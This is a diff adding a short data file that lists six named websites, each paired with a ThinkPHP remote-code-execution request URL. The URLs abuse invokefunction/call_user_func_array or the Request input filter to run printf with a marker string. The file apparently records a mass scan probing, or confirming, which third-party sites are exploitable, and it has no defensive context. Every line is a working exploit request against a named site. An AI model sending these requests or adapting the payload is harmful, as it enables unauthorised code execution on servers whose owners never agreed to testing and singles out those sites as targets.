@@ -1,0 +1,6 @@
+minorityhealthstl.org	invokefunction	https://minorityhealthstl.org/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+mail.roycerolls.net	invokefunction	https://mail.roycerolls.net/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+redmondoregonrotary.com	invokefunction	https://redmondoregonrotary.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+yepom.com	input-filter	https://shop119849753.world.taobao.com/index.php?s=index/\think\Request/input&filter[]=printf&data=tprce_mark_8842
+capandmore.com	invokefunction	http://cappsbaby.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
+occhialevintage.com	invokefunction	https://occhialevintage.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%stprce_mark_8842
